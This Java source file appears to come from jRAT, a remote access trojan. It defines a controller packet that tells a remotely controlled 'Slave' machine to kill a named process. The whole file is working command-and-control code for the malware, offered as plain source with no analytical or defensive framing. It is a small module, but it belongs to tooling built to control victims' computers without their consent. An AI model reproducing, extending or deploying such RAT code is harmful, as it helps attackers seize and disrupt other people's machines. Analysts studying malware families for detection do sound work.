package jrat.module.process;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.AbstractOutgoingPacket;

import java.io.DataOutputStream;


public class PacketKillProcess extends AbstractOutgoingPacket {

	private String process;

	public PacketKillProcess(String process) {
		this.process = process;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(process);
	}

	@Override
	public short getPacketId() {
		return 20;
	}

}
